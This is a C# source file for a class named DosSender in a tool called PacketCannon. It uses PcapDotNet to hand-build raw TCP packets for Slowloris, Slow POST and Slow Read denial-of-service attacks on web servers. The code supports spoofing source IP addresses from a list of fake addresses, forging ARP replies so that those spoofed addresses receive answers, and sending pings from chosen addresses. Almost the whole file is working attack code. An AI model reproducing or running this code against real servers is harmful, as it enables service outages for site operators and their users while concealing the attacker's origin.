using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using static PacketCannon.SenderStatus;
using HttpVersion = PcapDotNet.Packets.Http.HttpVersion;

namespace PacketCannon
{
    public class DosSender
    {
        public MacAddress SourceMac { get; set; }
        public MacAddress DestinationMac { get; set; }
        public IpV4Address SourceIpV4 { get; set; }
        public IpV4Address DestinationIpV4 { get; set; }
        public string Host { get; set; }
        public SenderStat Status = SenderStat.SendSyn;
        public static ushort NextSourcePort;
        public readonly int SlowPostContentLength;
        public readonly string SlowLorisKeepAliveData;
        public readonly string SlowLorisHeaderNotComplete;
        public readonly string SlowPostHeader;
        public string SlowReadUrl { get; set; }
        public int Waited = 0;
        private static readonly Random Rand = new Random();

        public readonly ushort SourcePort;
        public static ushort DestinationPort = 80;
        public uint SeqNumber = (uint)new Random().Next();
        public uint ExpectedAckNumber;
        public ushort WindowSize = 100;
        public uint AckNumber;
        private ushort _identificatioNumber = (ushort)new Random().Next(100, 1000);

        //Constructor for sender
        public DosSender(string sourceIp, string destIp, MacAddress destMac, MacAddress sourceMac, string host, string slowLorisKeepAliveData, string slowLorisHeaderNotComplete, int slowPostHeaderContentLength, string slowPostHeader, string slowReadUrl, int startPort, int portStep, bool ddos = false, ushort slowReadWindowSize = 100)
        {
            if (ddos)
            {
                var randomNumber = Rand.Next() % DosController.FakeIpV4Addresses.Count;
                Console.WriteLine(randomNumber);
                SourceIpV4 = DosController.FakeIpV4Addresses[randomNumber];
            }
            else SourceIpV4 = new IpV4Address(sourceIp);

            DestinationIpV4 = new IpV4Address(destIp);
            SourceMac = sourceMac;
            DestinationMac = destMac;
            SlowLorisHeaderNotComplete = slowLorisHeaderNotComplete;
            SlowPostHeader = slowPostHeader + $"\r\nContent-Length: {slowPostHeaderContentLength}\r\n\r\n";
            SlowReadUrl = slowReadUrl;
            WindowSize = slowReadWindowSize;
            SlowPostContentLength = slowPostHeaderContentLength;
            SlowLorisKeepAliveData = slowLorisKeepAliveData;
            Host = host;
            SourcePort = (ushort)(startPort + NextSourcePort);
            NextSourcePort += (ushort)portStep;
        }

        public void SendSyn(PacketCommunicator communicator)
        {
            // // Ethernet Layer
            // EthernetLayer ethernetLayer = new EthernetLayer
            // {
            //     Source = SourceMac,
            //     Destination = DestinationMac,
            // };
            //
            // // IPv4 Layer
            // IpV4Layer ipV4Layer = new IpV4Layer
            // {
            //     Source = SourceIpV4,
            //     CurrentDestination = DestinationIpV4,
            //     Ttl = 128,
            //     Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //     Identification = _identificatioNumber,
            // };
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            // TCP Layer
            //TcpLayer tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    ControlBits = TcpControlBits.Synchronize,
            //    Window = WindowSize,
            //};
            CreateTcpLayer(out var tcpLayer, TcpControlBits.Synchronize);
            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            ExpectedAckNumber = SeqNumber + 1;
        }

        public void SendAck(PacketCommunicator communicator)
        {
            // // Ethernet Layer
            // EthernetLayer ethernetLayer = new EthernetLayer
            // {
            //     Source = SourceMac,
            //     Destination = DestinationMac,
            // };
            //
            // // IPv4 Layer
            // IpV4Layer ipV4Layer = new IpV4Layer
            // {
            //     Source = SourceIpV4,
            //     CurrentDestination = DestinationIpV4,
            //     Ttl = 128,
            //     Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //     Identification = _identificatioNumber,
            // };
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);
            // TCP Layer
            // TcpLayer tcpLayer = new TcpLayer
            // {
            //     SourcePort = SourcePort,
            //     DestinationPort = DestinationPort,
            //     SequenceNumber = SeqNumber,
            //     AcknowledgmentNumber = AckNumber,
            //     ControlBits = TcpControlBits.Acknowledgment,
            //     Window = WindowSize,
            // };
            CreateTcpLayer(out var tcpLayer, TcpControlBits.Acknowledgment);
            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            _identificatioNumber++;
        }

        public void SendSlowlorisNotCompleteGet(PacketCommunicator communicator)
        {
            //// Ethernet Layer
            //var ethernetLayer = new EthernetLayer
            //{
            //    Source = SourceMac,
            //    Destination = DestinationMac,
            //};
            //
            //// IPv4 Layer
            //var ipV4Layer = new IpV4Layer
            //{
            //    Source = SourceIpV4,
            //    CurrentDestination = DestinationIpV4,
            //    Ttl = 128,
            //    Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //    Identification = _identificatioNumber,
            //};
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            // TCP Layer
            //var tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    AcknowledgmentNumber = AckNumber,
            //    ControlBits = (TcpControlBits)24,
            //    Window = WindowSize,
            //};
            CreateTcpLayer(out var tcpLayer, (TcpControlBits)24);

            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisHeaderNotComplete))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendSlowLorisKeepAlive(PacketCommunicator communicator)
        {
            // // Ethernet Layer
            // EthernetLayer ethernetLayer = new EthernetLayer
            // {
            //     Source = SourceMac,
            //     Destination = DestinationMac,
            // };
            //
            // // IPv4 Layer
            // IpV4Layer ipV4Layer = new IpV4Layer
            // {
            //     Source = SourceIpV4,
            //     CurrentDestination = DestinationIpV4,
            //     Ttl = 128,
            //     Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //     Identification = _identificatioNumber,
            // };
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);
            // TCP Layer
            //TcpLayer tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    AcknowledgmentNumber = AckNumber,
            //    ControlBits = (TcpControlBits)24,
            //    Window = 222,
            //};
            CreateTcpLayer(out var tcpLayer, (TcpControlBits)24);
            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisKeepAliveData + "\r\n"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);

            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendSlowPostHeader(PacketCommunicator communicator)
        {
            // // Ethernet Layer
            // var ethernetLayer = new EthernetLayer
            // {
            //     Source = SourceMac,
            //     Destination = DestinationMac,
            // };
            //
            // // IPv4 Layer
            // var ipV4Layer = new IpV4Layer
            // {
            //     Source = SourceIpV4,
            //     CurrentDestination = DestinationIpV4,
            //     Ttl = 128,
            //     Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //     Identification = _identificatioNumber,
            // };
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            // TCP Layer
            //var tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    AcknowledgmentNumber = AckNumber,
            //    ControlBits = (TcpControlBits)24,
            //    Window = WindowSize,
            //};
            CreateTcpLayer(out var tcpLayer, (TcpControlBits)24);
            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowPostHeader))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendSlowPostKeepAlive(PacketCommunicator communicator)
        {
            //// Ethernet Layer
            //EthernetLayer ethernetLayer = new EthernetLayer
            //{
            //    Source = SourceMac,
            //    Destination = DestinationMac,
            //};
            //
            //// IPv4 Layer
            //IpV4Layer ipV4Layer = new IpV4Layer
            //{
            //    Source = SourceIpV4,
            //    CurrentDestination = DestinationIpV4,
            //    Ttl = 128,
            //    Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //    Identification = _identificatioNumber,
            //};
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            // TCP Layer
            //TcpLayer tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    AcknowledgmentNumber = AckNumber,
            //    ControlBits = (TcpControlBits)24,
            //    Window = 222,
            //};
            CreateTcpLayer(out var tcpLayer, (TcpControlBits)24);
            //Random character as data
            var a = (char)('a' + Rand.Next(0, 26));
            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes($"{a}"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendSlowReadCompleteGet(PacketCommunicator communicator)
        {
            //// Ethernet Layer
            //var ethernetLayer = new EthernetLayer
            //{
            //    Source = SourceMac,
            //    Destination = DestinationMac,
            //};
            //
            //// IPv4 Layer
            //var ipV4Layer = new IpV4Layer
            //{
            //    Source = SourceIpV4,
            //    CurrentDestination = DestinationIpV4,
            //    Ttl = 128,
            //    Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
            //    Identification = _identificatioNumber,
            //};
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            // TCP Layer
            //var tcpLayer = new TcpLayer
            //{
            //    SourcePort = SourcePort,
            //    DestinationPort = DestinationPort,
            //    SequenceNumber = SeqNumber,
            //    AcknowledgmentNumber = AckNumber,
            //    ControlBits = TcpControlBits.Acknowledgment,
            //    Window = WindowSize,
            //};
            CreateTcpLayer(out var tcpLayer, TcpControlBits.Acknowledgment);
            HttpRequestLayer httpRequestLayer = new HttpRequestLayer
            {
                Uri = SlowReadUrl,
                Method = new HttpRequestMethod(HttpRequestKnownMethod.Get),
                Version = HttpVersion.Version11,
                Header = new HttpHeader(HttpField.CreateField("Host", Host))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpRequestLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void PingAddress(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            //EthernetLayer ethernetLayer = new EthernetLayer
            //{
            //    Source = SourceMac,
            //    Destination = DestinationMac
            //};
            //
            //// IPv4 Layer
            //IpV4Layer ipV4Layer = new IpV4Layer
            //{
            //    Source = ipAddress,
            //    Ttl = 128,
            //    CurrentDestination = DestinationIpV4
            //};
            CreateEthAndIpv4Layer(out var ethernetLayer, out var ipV4Layer);

            var icmpLayer = new IcmpEchoLayer();

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, icmpLayer);
            communicator.SendPacket(packet);
        }

        public void SendArpResponse(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            var a = Regex.Matches(SourceMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var macParsed = new byte[a.Length];
            for (int i = 0; i < a.Length; i++)
            {
                macParsed[i] = (byte)int.Parse(a[i], System.Globalization.NumberStyles.HexNumber);
            }
            var b = Regex.Matches(DestinationMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var targetMacParsed = new byte[b.Length];
            for (int i = 0; i < b.Length; i++)
            {
                targetMacParsed[i] = (byte)int.Parse(b[i], System.Globalization.NumberStyles.HexNumber);
            }

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Reply,
                SenderHardwareAddress = macParsed.AsReadOnly(),
                SenderProtocolAddress = ipAddress.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
                TargetHardwareAddress = macParsed.AsReadOnly(),
                TargetProtocolAddress = DestinationIpV4.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
            };
            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, arpLayer);
            communicator.SendPacket(packet);
        }

        private void CreateEthAndIpv4Layer(out EthernetLayer ethernetLayer, out IpV4Layer ipV4Layer)
        {
            ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac
            };

            // IPv4 Layer
            ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber
            };
        }

        private void CreateTcpLayer(out TcpLayer tcpLayer, TcpControlBits controlBits)
        {
            tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = controlBits,
                Window = WindowSize,
            };
        }
    }
}